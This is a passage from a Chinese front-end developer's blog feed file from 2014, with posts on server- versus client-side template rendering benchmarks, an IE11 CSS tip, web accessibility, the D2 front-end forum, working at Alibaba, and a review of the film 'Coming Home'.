class="line">&#125;</span><br></pre></td></tr></table></figure><p>找个有 textarea 的页面，打开控制台，输入字符，验证下吧~</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 问答 </tag>
            
            <tag> textarea </tag>
            
            <tag> 自适应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据交给谁来解析，前端还是后端？</title>
      <link href="/blog/2014/11/28/data-compile-by-f2e-or-r2e/"/>
      <url>/blog/2014/11/28/data-compile-by-f2e-or-r2e/</url>
      
        <content type="html"><![CDATA[<p><a href="//cnodejs.org/topic/5476b1cc65e5a201268b9220#5477dc1c65e5a201268b929f">原文</a>引用：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">首先，预编译跟前后端没有关系，预编译一样可以用于后端渲染。</span><br><span class="line"></span><br><span class="line">看看下面的测试时间，单位: ms</span><br><span class="line"></span><br><span class="line">模板字符串:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">&#x27;&#123;&#123;#datas&#125;&#125;&#123;&#123;name&#125;&#125; abcdefg &#123;&#123;type&#125;&#125; &#123;&#123;date&#125;&#125;&#123;&#123;/datas&#125;&#125;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">数据对象: 放入<span class="number">100000</span>行数据</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> stack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        stack.<span class="built_in">push</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;name-&#x27;</span> + i,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;type-&#x27;</span> + i,</span><br><span class="line">            <span class="attr">date</span>: (<span class="keyword">new</span> <span class="built_in">Date</span>()).toLocaleString()</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> datas = &#123;<span class="attr">datas</span>: stack&#125;;</span><br><span class="line">    </span><br><span class="line">后端渲染:</span><br><span class="line">生成HTML</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> start = <span class="built_in">Date</span>.<span class="built_in">now</span>();</span><br><span class="line">    require(<span class="string">&#x27;hogan&#x27;</span>).compile(s).render(datas);</span><br><span class="line">    <span class="keyword">var</span> end = <span class="built_in">Date</span>.<span class="built_in">now</span>();</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(end - start);  <span class="comment">// 166 ms　我的机器时间</span></span><br><span class="line">    </span><br><span class="line">前端渲染:</span><br><span class="line">我在这里做了最简单的设定，只把datas转化成字符串</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> start = <span class="built_in">Date</span>.<span class="built_in">now</span>();</span><br><span class="line">    JSON.stringify(datas);</span><br><span class="line">    <span class="keyword">var</span> end = <span class="built_in">Date</span>.<span class="built_in">now</span>();</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(end - start);  <span class="comment">// 450 ms 我的机器时间</span></span><br><span class="line">    </span><br><span class="line">结果对比一目了然，你可以把这个测试用其他模板引擎测试一下。</span><br><span class="line"></span><br><span class="line">服务器为了前端渲染，对对象的字符串化所消耗的时间，</span><br><span class="line">远远大于　</span><br><span class="line">服务器直接渲染模板生成HTML所花费的时间。</span><br></pre></td></tr></table></figure><p>这个问题的焦点并不在“放在哪里渲染快”，如果你要考虑这个效率问题，那是不是也得同时思考下：</p><ul><li>后端渲染完了之后，需要进行网络传输的体积大了，带来的网络损耗和网络传输时间问题</li></ul><p>很多场景，尤其是在移动端，我们通常不会把渲染工作交给后端，一方面后端渲染需要时间，一方面庞大的渲染数据传输也有时延，所以就会出现白屏问题。Bigpipe可以一定程度上处理这个问题，不过构架成本略高，用的人偏少。<br>若把数据交给前端渲染，也存在一定的弊端，比如需求发生变化之后，接口需要调整，前端模板的解析也要跟着一起变化，这样隔着一层接口开发，办事效率就低了很多，因为我们至少要跟开发同学交涉。</p><p>nodejs 的出现让模板复用方便了不少，很多时候，让后端渲染一部分（比如首屏部分），后面的工作就交给前端异步去处理。两者结合起来效果才是最佳的。</p><p>SEO问题嘛，看产品需求，很多产品优化了 SEO 也没多大作用，如果实在要考虑：</p><ol><li>可以使用 pjax &#x2F; quickling &#x2F; hash bang 等技术</li><li>服务器端根据 UA 输出内容</li></ol>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板渲染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>擦肩而过的都是过眼云烟</title>
      <link href="/blog/2014/11/18/%E6%93%A6%E8%82%A9%E8%80%8C%E8%BF%87%E7%9A%84%E9%83%BD%E6%98%AF%E8%BF%87%E7%9C%BC%E4%BA%91%E7%83%9F/"/>
      <url>/blog/2014/11/18/%E6%93%A6%E8%82%A9%E8%80%8C%E8%BF%87%E7%9A%84%E9%83%BD%E6%98%AF%E8%BF%87%E7%9C%BC%E4%BA%91%E7%83%9F/</url>
      
        <content type="html"><![CDATA[<p>。。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>去掉IE11中input右侧的关闭叉叉</title>
      <link href="/blog/2014/11/17/input-close-btn-in-ie11/"/>
      <url>/blog/2014/11/17/input-close-btn-in-ie11/</url>
      
        <content type="html"><![CDATA[<p>在 IE11 下，浏览器自作多情在 text input 组件上加一个 close 叉叉：</p><p><img src="/../blogimgs/2014/11/17/825ef988-6e3e-11e4-900a-5fadd3465d94.png" alt="image"><!--<source src="https://cloud.githubusercontent.com/assets/2698003/5064209/825ef988-6e3e-11e4-900a-5fadd3465d94.png">--></p><p>这么整：</p><pre><code>input::-ms-clear &#123; display: none; &#125; </code></pre><p>这种伪元素类似于 web component.</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让身体残疾的人可以访问Web</title>
      <link href="/blog/2014/11/17/web-accessibility/"/>
      <url>/blog/2014/11/17/web-accessibility/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Web accessibility means that people with disabilities can use the Web.<br /><br>让身体残疾的人可以访问Web，这就是 Web Accessibility。</p></blockquote><p>在中国，有数以百万甚至千万计的人无法正常地使用网络，不是因为他们脑子不好使，也不是因为他们没钱没文化，而是他们用来感知这个世界的能力受到了先天或者后天的破坏。WAI（Web Accessibility inititive）这个议题在<a href="http://www.w3.org/WAI/history">1997年五月份</a>被提上议案，至今已经形成了一个庞大的知识体系。</p><p>残疾人士包括：失明和低视力、失聪和重听、学习障碍、认知障碍、行动不便、言语残疾、光过敏患者和这些病症的复合患者。涉及类别包括：视觉、听觉、身体、语言、认知、语言、学习以及神经残疾。</p><p>事实上，网页无障碍化，其对象不限于残疾人士。如果哪一天你打球手骨折了，你可以感受下无障碍给你带来的便利；如果哪一天你也两鬓霜白，眼力退化、听力退化，网页无障碍化技术就是你的第二双眼睛、第二双耳朵…</p><p>后期我会投入一定的时间研究并推动相关内容。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网页无障碍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈谈D2</title>
      <link href="/blog/2014/11/01/cb-communication-in-d2/"/>
      <url>/blog/2014/11/01/cb-communication-in-d2/</url>
      
        <content type="html"><![CDATA[<p>很多参与了 <a href="http://d2forum.alibaba-inc.com/">D2</a> 的人还不知道 D2 是个什么东西，印象中就是很多很多前端工程师汇聚在一起，交流技术。D2 是 D2前端技术论坛的简称，英文名 Designer < Developer Frontend Technology Forum。下面的介绍比较官方：</p><blockquote><p>D2 由「淘宝网」发起，每届由 D2 前端技术论坛组委会（下简称 D2 组委会）组织，不同公司轮流承办。<strong>D2 前端技术论坛的基本宗旨：</strong></p><ul><li>Designer+Developer：让左右大脑相互碰撞，激起更多的火花。</li><li>基于商业实践：不脱离日常工作，帮助商业取得更好的成功。</li><li>开放：不会把任何想法、任何作品据为私有，一切都更开放。</li></ul><p><strong>D2 前端技术论坛的讨论范围：</strong></p><ul><li>互联网前端技术与产品：前端技术的应用，开发中的实际案例。</li><li>前端开发的行业发展：展望整个行业的发展方向，引领前端开发最新方向。</li></ul><p><strong>D2 前端技术论坛的最终目标：</strong></p><ul><li>创造业内交流平台</li><li>引导、规范行业发展</li><li>影响前端技术发展</li></ul></blockquote><p>今年的 D2 由阿里巴巴承办，参与人数有一千多人。前端盛事，群英荟萃，火花不断。谈D2，这个话题有点大了，本文主要说一说 D2 会场的气氛和分享内容的甄选角度，同时也谈一谈自己对前端发展的看法。</p><h3 id="d2_1"><a class="headeranchor-link" name="user-content-d2_1" href="#d2_1"></a>一、D2现场</h3><p>本届D2在上周六举办，隔了一个星期才来总结，记忆都有些淡了，不过大体的感受还是有的。与会登记人数有 1067 人，其中男性 884 人，女性 183 人，晚上酒会参加人数 118+ 人。这个规模，可以试想一下是个什么样的场面。与会者主要都是参与前端开发的工程师，也有少数还未毕业的学生。</p><p>对于参与者，D2 只设了一道坎，那就是在 <a href="//github.com/soulteary/Get-D2-2014-Ticket">github</a> 上 fork 项目，然后 pull request，提交内容中附带个人的博客地址或者微博等相关信息，方便审核者对你有一个简单的了解。我觉得这也是很有必要的。</p><p>各大公司都派出了自己的代表，但更多还是自发前往杭州。在盛会上，我看到了不少群友/同学/朋友/同事，由于当日着一身中国风服饰，加上出门前自拍了一张放到网上，会场很多朋友认出了我（其实，前端圈子还是蛮小的嘛~）。所以我相信，参与了 D2 的你，也一定看到了不少往日熟悉的身影。</p><p>本次 D2 有两个会场，主会场可容纳八九百人，分会场能够容纳一百多人，分会场的第一个分享被两三百人挤爆了，后续大家都默默的驻守在主会场，所以分会场后几场还是有些相对萧条的。</p><p>主会场</p><p><img src="https://images.cnitblog.com/blog/387325/201411/011126593624339.jpg" alt="主会场"></p><p>分会场</p><p><img src="https://images.cnitblog.com/blog/387325/201411/011126361907584.jpg" alt="分会场"></p><p>酒会场</p><p><img src="https://images.cnitblog.com/blog/387325/201411/011128021596319.jpg" alt="酒会场"></p><p>引用<a href="http://weibo.com/dh20156">@dh20156 的一句话：</p><blockquote><p>举办一场千人会议确实不容易，但只要<code>主题明确</code>，<code>计划妥当</code>，<code>流程清晰</code>，<code>执行到位</code>，还是可以愉快玩耍的!</p></blockquote><p>因为刚毕业，接触前端时间也不是很长，之前对 D2 没什么了解，这也是我第一次参加 D2，真切的感受到了会场的活跃。我觉得，<strong>更重要的是，会场之后的活跃！</strong></p><h3 id="_1"><a class="headeranchor-link" name="user-content-_1" href="#_1"></a>二、分享内容的甄选</h3><p>下面是本届 D2 分享的内容列表，及相关 PPT 链接：</p><ul><li><a href="http://vdisk.weibo.com/s/C30SUspJtfdET">《指尖上的数据》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtfe1v">《支付宝前后端分离的思考与实践》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtfe4O">《nodejs一小步 前端开发一大步》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtfe1b">《Listen to the buzz of Angular.JS》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtfdhI">《第三方开发前端实践》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtfe20">《企业级 NPM 服务在阿里的实践》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtfdi5">《面向多端的蘑菇街前端技术架构》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtex-X">《航旅无线H5技术体系成长之路》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtf4sv">《京东前端工业化实践之路》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtfe1a">《淘宝前端工程与自动化体系》</a></li><li><a href="http://johnhax.net/2014/es6-js-future/">《透过ES6看JS未来》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtesC9">《架构与IBM前端 》</a></li><li><a href="http://vdisk.weibo.com/s/C30SUspJtf7lO">《豆瓣的前端发展思路》</a></li></ul><p>具体也可以在<a href="http://d2forum.alibaba-inc.com/">官网</a>上查看。</p><p>事实上，本次D2总共提交了三四十个分享主题，上述这些主题都是经过前端资深专家的慎重思考和筛选之后确定的。从分享的标题中，我们可以提炼出这些字眼：数据、架构、体系、实践、发展、nodejs、工程。很显然，前端开发已经告别了刀根火种的猿人时代，对前端技术的讨论方向并未局限在某个知识点上，更多的是工程化实践和自动化系统的构建，这也是各大互联网公司发展起来后一个必然的趋势。</p><p>Nodejs 的出现为前端工程师在服务器端开辟了一块领域，有人说我们抢了后端同学的饭碗。并非如此，Nodejs 作为一个中间层出现在前后端之间，厘清了各端之间的职责，为web发展提供了更加清晰的思路，这一点毋庸置疑。但是这次没听到<a href="http://weibo.com/xicilion">@响马大叔</a> 的 <a href="//github.com/xicilion/fibjs">fibjs</a> 分享，还是有些遗憾。</p><p>各大公司为了抢占市场份额，业务方向也是由点及面的扩散，业务增多不能单靠增加工程师的数量来跟上业务需求，只能让技术跟上时代的脚步。</p><p>会场是有姑娘的，找姑娘交流技术也是本次参加 D2 的一个重要使命，所以请原谅我不能为大家一一分享上述每个主题的细节内容。认认真真听进去的只有百度FEX的张可竞分享的《指尖上的数据》。主题很文艺，内容也是很贴切，下面就简单复述下介绍的内容，并谈谈自己的感受。</p><p>移动互联网的迅速崛起，让前端工程师们有点猝不及防。在移动设备上，人们通过手指的触摸来了解这个大千世界，张可竞从手指触摸的细节和数据在移动终端呈现的形态上着手，做了深入的分析，最后回到技术上，他提到了这么几个点：</p><ul><li>设备的适配问题</li><li>手机的性能问题</li><li>技术框架</li><li>...</li></ul><p>这些都是移动开发中的疼点，也是值得每一个开发者去探究的问题。去年我给老外做过一次外包，在设计上就已经很明显的感觉到国内外移动互联网技术差异，其实技术都在那里，只是国内的技术潮流还在婴幼儿阶段跃跃欲试，含苞待放。</p><h3 id="_2"><a class="headeranchor-link" name="user-content-_2" href="#_2"></a>三、我对前端发展的看法</h3><p>很多人对 ECMAScript 6 持消极态度，说把 JavaScript 搞的太复杂了，越来越像 Ruby/Python/Java 了，一门语言的丰富，不仅仅是对语言本身的拓展，这些内容取决于市场的需求。而且本次 D2 讨论的话题是不是和 ES6 引入了模块化、异步编程等相关内容十分契合呢！</p><p>HTML5规范历时8年，也在近期宣布制定完成。如今的 web 发展步入了一个平稳阶段，我认为后续我们需要思考的，包含如下问题：</p><ul><li>信息安全问题</li><li>实时通讯问题</li><li>应用开发问题</li><li>....</li></ul><h3 id="_3"><a class="headeranchor-link" name="user-content-_3" href="#_3"></a>四、小结</h3><p>最后还是一如既往地做个小结，三个点。</p><p><strong>1. 移动端内容过少</strong></p><p>移动互联网技术是个重要的议题，据我所知，目前阿里很大一部分的流量来自于移动终端。而本次重点对移动端技术的介绍偏少。希望下次 D2 能够有些拓展！</p><p><strong>2. 听分享不是重点</strong></p><p>过来听分享会不是重点。分享效果取决于分享者的演讲能力以及他们对分享内容研究的深度。而二者兼备的人并不多，加上受众并不全是资深的工程师，很多内容是难以一时消化的。</p><p>前端峰会的目的，前面也说了：创造业内交流平台，引导、规范行业发展，影响前端技术发展。我觉得，最实际的意义是多认识几个人，以后遇到问题多几个人可以一起探讨、交流。</p><p><strong>3. 无障碍体验区</strong></p><p>除了几个会场，还有一些分区，其中一个叫做『无障碍体验』，现代人都讲求"民主"、"平等"，技术上也是一样，我们应该更多地关注社会弱势群体。目前阿里巴巴建立了无障碍兴趣小组，我们会在业余时间针对阿里巴巴页面做一些信息无障碍的优化以及推广，也希望更多公司加入进来，提高产品易用性，让信息无障碍深入人心。</p><p>最后，让我们一起来期待明年的<strong>D2盛典</strong>吧！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
          <category> 观点和感想 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我在阿里这仨月</title>
      <link href="/blog/2014/10/30/cb-life-in-alibaba/"/>
      <url>/blog/2014/10/30/cb-life-in-alibaba/</url>
      
        <content type="html"><![CDATA[<h2 id="_1"><a class="headeranchor-link" name="user-content-_1" href="#_1"></a></h2><p>Alibaba 试用期是三个月，转眼三个月过去了，也到了转正述职的时间。回想这三个月做过的事情，很多很杂，但还是有重点。</p><p>本文谈一谈工作中遇到的各种场景，需要用到的一些前端知识，以及我对前端进阶学习的一点思考。</p><h3 id="_2"><a class="headeranchor-link" name="user-content-_2" href="#_2"></a>一、漫谈</h3><p>刚入职不久阿里巴巴就上市了，这是件振奋人心的事情。实际上在正式入职之前，我就已经在淘宝UED实习了三个月，所以这边的工作环境和开发流程都比较熟悉了。</p><p>在工作中，遇到了很多这样的场景：</p><h4 id="1-bug"><a class="headeranchor-link" name="user-content-1-bug" href="#1-bug"></a>1. 线上 bug 处理</h4><blockquote><p>运营："嘿，小胡子，有客户反馈这个提交表单的页面中，上传图片预览总是失败，麻烦你跟进下这个case~"。小胡子哥："哦，好的！"</p></blockquote><p>这个时候手头可能有很多工作，但记住一个原则，线上问题的优先级是最高的，"客户第一"是阿里也是所有公司必须秉承的一个价值观理念。</p><p>打开浏览器，发现我这边并没有图片上传预览失败的问题，我纳闷了良久，期间让用户尝试换浏览器、电脑，未果，最后不得不远程连接客户的电脑，查看问题。（最后定位原因为某个地区的 CDN 出了问题）</p><h4 id="2"><a class="headeranchor-link" name="user-content-2" href="#2"></a>2. 网站改版（前端开发流程）</h4><blockquote><p>老大："小胡子，以后你就负责这两条业务线了哈~"。小胡子哥："嗯"。某天，运营："网站上线几个新增功能，之前的流程需要优化，本次将对 xx网站改版，几哩吧啦几哩吧啦..... 小胡子啊，几哩吧啦几哩吧啦....."。小胡子哥："这个需求前端实现成本太高，是不是可以这样；这个地方的修改，几哩吧啦几哩吧啦.....好的！"。</p></blockquote><p>一个大的需求过来，一般会经过多次评审。刚开始是产品GG和运营MM们互喷口水，喷完了PRM评审也就完了，那么这个时候一般就确定要做什么啦，然后会把前端、视觉、开发等同学都叫过去参加交互评审，交互评审敲定之后，视觉同学就回去画图啦，这个时候后端同学会去准备数据，前端同学会跟视觉MM联系紧密，形影不离。</p><p>视觉稿设计完了之后，前端就正式投入开发了。刚开始会面临一个问题，前后端的接口谁来拟订？</p><p>后端数据还在准备中，<strong>如果后端拟订接口</strong>，则刚开始后端需要模拟数据，此时接口地址和前端开发环境还不在一个域下，取数据存在跨域问题，如果先改成 jsonp 的接口，开发完毕再改成 json 接口，那么后续程序也需要跟着一起改动。<strong>如果前端拟订接口</strong>，则前端需要在本地 mock 数据，若开发完毕时后端数据依然没有准备好，那么联调又是一个麻烦事儿，可能后端还得模拟一次数据，这样前端后端都实现了依次数据模拟，重复工作，冗余。庆幸的是我们有数据接口拟订的工具，这个工具可以将接口信息以文档形式沉淀，并且提供了可跨域访问的 mock 数据，接口的修改也变得异常方便。</p><p>好，既然有工具，那我就辛苦点吧~ 写好数据接口，交给后端同学 review，然后开始切图（做业务嘛，唉...）公司内部使用的前端框架叫做 <a href="http://docs.kissyui.com/5.0/">KISSY</a>，目前已经升级到 5.0，而使用比较多的还是 1.4.x 版本。这是个啥玩意儿呢，很多公司没有自己的框架，于是便使用 JQ 开发，这个 KISSY 也是一样的，他就是公司的 JQuery，不过框架对业务更加有亲和力，KISSY 提供了数量庞大的组件和插件，易用性很强，但学习有一定的门槛。</p><p>使用 KISSY 完成业务逻辑的开发。我们会将代码发布到 CDN 上，这点我需要得瑟下，阿里的前端发布系统真是好用到了极致！因为 HTML 部分是后端管的，我们开发好 HTML/CSS/JS 之后，会将 HTML 交给后端同学，同时将静态资源 (CSS/JS/IMG) 发布到线上，图片可以直接上传，CSS和JS在本地打包之后，push 到仓库，系统会自动完成 CDN 部署，一般前端的改动在两分钟之内就能在线上见效，一天发布几十个版本毫无压力，不像某度公司，胆战心惊的排着长队发布一个小小的改动，发布的时候还担心别人抢先上线，自己又得 merge 代码（去年在百度实习情况还是这样，不知道如今改善了多少）。</p><p>待后端同学也开发完毕后，我们会把测试MM叫到旁边，让她们帮着测试系统bug，这个时候也可以把运营MM叫过来一起测试，修完 bug 就可以正式上线了。</p><p>所以在阿里，前端资源是提早上线的，完了后端代码才会上。上面所说皆为 PC 端的开发流程，Mobile 端还是有很大差异，这里就不细说了。</p><h4 id="3"><a class="headeranchor-link" name="user-content-3" href="#3"></a>3. 需求的变更</h4><blockquote><p>小胡子哥正在得瑟顺利的完成了一个项目的开发，可是此时，运营MM跑过来说："某个功能因为xx原因本期不能上线了，需要等到V2版本再发，需要前端协助删除xx模块。"小胡子寻思着，皱了皱眉头。运营MM含情脉脉的对视着小胡子，小胡子说："那，好吧，改完之后需求还变么？"运营MM点了点头，然后又摇了摇头。小胡子心想："妈蛋"。</p></blockquote><p>然后继续上述流程。</p><p>那些还没有出过校门的童鞋们，看到这里，你是不是对公司项目的开发有了大概的了解呢？以上的三个场景是十分常见的，但是在公司绝不仅仅只干这些事情。</p><p>在这三个月里，我参与了一个前端自动化检测工具的开发，完成了前后端的改造。所用到的技术嘛，稍微列一列：</p><ul><li>websocket 实时通讯</li><li>scss/less css预处理语言</li><li>grunt/gulp 打包工具</li><li>MVC 分离思想</li><li>Promise 异步编程框架</li><li>Middleware 中间件的编写</li><li>Express Node的框架</li><li>...</li></ul><p>涉及到的技术点，很多很多，这些只是一个项目中用到的部分内容。前端，暗藏无数杀机，如果对基础东西掌握不牢靠，你会发现别人三小时搞定的事情，到你这里就得三天，因为你一直在踩坑！</p><h3 id="_3"><a class="headeranchor-link" name="user-content-_3" href="#_3"></a>二、前端进阶的思考</h3><blockquote><p>很多优秀的前端同学，在学到一定水平之后，会感觉学到尽头了，每天愁着怎么去学习新知识，学习什么新知识。也有很多同学，学习的重点跟工作后的从事内容偏差颇大。所以我想着能不能在这方面跟大家交流一下，一起探讨。</p></blockquote><p>我在微博上也提出了这样的问题。很多同学学习没有规律，今天来点这个明天来点那个，学完之后感觉自己都懂了，但没有太多的平台/工具来检测自己所学是不是到位，然后突然某一天问道，下一步我该学啥？</p><p>每个人成长都有一个过程，在这个过程中，我们会经历多次蜕变。踏过前端门槛之后，下一步要想的事情是进阶，提升自己的技能。</p><p>在进阶方面，我问个简单的问题：git，你熟练么？</p><p>前端发布资源到 CDN 采用的就是 git，诸如 add commit diff log status tag remote push merge 等等，这些 git 常用命令，你是否都熟悉了？git 的版本管理有哪些思路，比如线上出现了 bug，你会如何处理程序，新建分支开发？在原有基础上开发？如何管理版本？等等。</p><p>很多知识是需要花费大量的时间学习的，比如 backbone, JQuery源码分析, MVVM, 设计模式, HTTP协议, 响应式, 异步编程, 模块化, websocket, DOM监控, 本地储存, 浏览器渲染原理等等，平时学习的时候可以把这些关键字枚举下，然后针对每个关键字延伸学习。</p><p>延伸学习的方式很简单，google 一个关键词你能看到十几篇优秀的博文，再这些博文中寻找新的关键字，直到整个大知识点得到突破。我一直都是这么学习的。</p><h3 id="_4"><a class="headeranchor-link" name="user-content-_4" href="#_4"></a>三、小结</h3><p>好吧，叽哩咕噜又扯了一堆，阿里巴巴是个不错的公司，如果想过来的话，可以联系我哟~ 学习是件长久并且艰苦的事情，收拾好心情，先睡个好觉，明天搞起吧！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百阿，我们是怎么‘走’到一起的</title>
      <link href="/blog/2014/10/09/%E7%99%BE%E9%98%BF%EF%BC%8C%E6%88%91%E4%BB%AC%E6%98%AF%E6%80%8E%E4%B9%88%E2%80%98%E8%B5%B0%E2%80%99%E5%88%B0%E4%B8%80%E8%B5%B7%E7%9A%84/"/>
      <url>/blog/2014/10/09/%E7%99%BE%E9%98%BF%EF%BC%8C%E6%88%91%E4%BB%AC%E6%98%AF%E6%80%8E%E4%B9%88%E2%80%98%E8%B5%B0%E2%80%99%E5%88%B0%E4%B8%80%E8%B5%B7%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<p>百阿——百年阿里，马总说阿里要持续健康发展 102 年，刚好横跨三个世纪，这是一个十分宏伟的蓝图。</p><p>阿里巴巴是一个价值观驱动的公司，目前她俨然已经成了一个商业生态系统，为维持这个系统的良性循环，百阿成为一个不可忽视的环节。</p><p>本期百阿的班主任是一个英俊潇洒也是极富历史厚重感的安徽大哥（开始本以为他是宁波人，口音跟我一个同学蛮像的）。一堆陌生的同学，短短两天内，彼此已经颇有默契，下面来看一看，大家是如何凝聚到一起的。</p><p>游戏。一波人围成一个圈，彼此紧贴在一起，前者蹲坐在后者的腿上，我们坚持了 30s。这个游戏打破第一道防线——身体的防线，身体的零接触，让彼此之间消除陌生感。班内男女比例基本协调，班主任有意男女错开，消除了男生和女生之间的尴尬。</p><p>分组，记名字。将大圈化成小圈，减少信息量的输入，认识身边的几个人。</p><p>小组任务。小组 Logo 设计，口号构思。大家一起完成某个任务，增进组内感情。</p><p>生命圈。一张白纸上画一个圈，将圆圈分成多个扇形，一个扇形区域代表一个 7 年时间段的经历，每个人都向大家述说自己的成长的喜怒哀乐。</p><p>课外小组任务。午饭一同进餐后，闲聊一番，约好下午的讨论地点。然后凑在一起，做了很多事情，大家相互协作，深入讨论，十分带感！</p><p>还有一些，比如把大家拉到一个交流群组，大晚上十一二点还在扯淡；三天内在园区做一件 Crazy 的事情等等。</p><p>一个小组，十几人，才两天时间就已经建立了比较有意思的连接。大家还约定了本周日去 K歌、吃饭，我想以后还会有更多的机会相处在一起！</p><p>感谢百阿！感谢这两天陪伴在一起的小伙伴们，虽说明天就是最后一天了，但这三天相处的记忆将会永存。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爱是平淡的</title>
      <link href="/blog/2014/10/06/%E7%88%B1%E6%98%AF%E5%B9%B3%E6%B7%A1%E7%9A%84/"/>
      <url>/blog/2014/10/06/%E7%88%B1%E6%98%AF%E5%B9%B3%E6%B7%A1%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<p>国庆七天假，六天已经过去了，没出门，宅在家里。今天晚上把陈道明主演的《归来》看了下。故事是这样的：</p><blockquote><p>上世纪70年代初，与家人音讯隔绝多年的劳改犯陆焉识（陈道明饰），因思念心切在一次农场转迁途中逃跑回家。他的行为给怀有芭蕾舞梦想的女儿丹丹（张慧雯饰）带来巨大的压力。女儿想方设法阻止母亲冯婉瑜（巩俐饰）与父亲陆焉识相见，结果使夫妻俩近在咫尺，却只能再次相隔天涯。</p></blockquote><p>冯婉瑜因为心理疾病，已经忘记了他的丈夫陆焉识的长相，但是她深爱着他。因为曾经收到一封信说他5号从大西北回来，每月5号都会去火车站等待自己的丈夫，每次都是伤心的离去。而此时，陆一直就在他身边。陆无奈，只好通过各种方式和这个不认识自己的妻子打交道，缓和妻子和女儿之间的矛盾，照顾日渐沧桑的婉瑜。</p><p>刚开始，妻子不认识他，甚至赶他出门。冯不让女儿跟自己一起住，又得了失忆症，陆很是忧愁.可一扇门挡不住真挚的爱情，后来把自己劳改时写的一箱子没送出去的信又重新一次性寄给了冯，然后每天给冯述说曾经的种种，并把自己想说的话偷偷掺进信堆里。</p><p>张艺谋导演确实是个天才导演，每个画面都把握地十分到位。故事的发展不紧不慢的娓娓道来，点到即止，恰到好处。听说陈道明是国内最贵的电视剧演员，一集得个几十上百万吧，他现在选戏也比较挑，一般的杂牌戏是请不动他的，上就一定是深远、寓意深刻的电视电影。我一直都很欣赏他。</p><p>作为父亲，包容女儿的一切，随和。作为丈夫，将全部的爱倾注在病重的妻子身上，无微不至的照顾，而令人憋心的是，在妻子的眼里他就只是个每天为自己念信的先生。但是，每个画面传递的爱意，已经足够感动每个观众。</p><p>相比现在，三四十年前的人显得更加古朴，他们涂的只是个生计，没有太多的物质欲望，这样故事流露出来的更多的是人间真情，我想张艺谋也是对这个时代充满兴趣的。</p><p>爱一个人，不一定要轰轰烈烈如梁祝化蝶成传世佳谈，平淡的爱情就像呼吸一样，很自然，很祥和，很平淡。微信上看到一个朋友传了两张照片，她说这样的桥段让自己很受感动。</p><p><img src="/../blogimgs/2014/10/06/mmexport1412602015076.jpg" alt="小说"><!--<source src="http://barretlee.com/life/content/images/2014/Oct/mmexport1412602015076.jpg">--></p><p><img src="/../blogimgs/2014/10/06/mmexport1412602018170.jpg" alt="小说"><!--<source src="http://barretlee.com/life/content/images/2014/Oct/mmexport1412602018170.jpg">--></p><p>可能平淡的爱就是这样。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不敢选择，在怕什么？</title>
      <link href="/blog/2014/10/04/%E4%B8%8D%E6%95%A2%E9%80%89%E6%8B%A9%EF%BC%8C%E5%9C%A8%E6%80%95%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
      <url>/blog/2014/10/04/%E4%B8%8D%E6%95%A2%E9%80%89%E6%8B%A9%EF%BC%8C%E5%9C%A8%E6%80%95%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
      
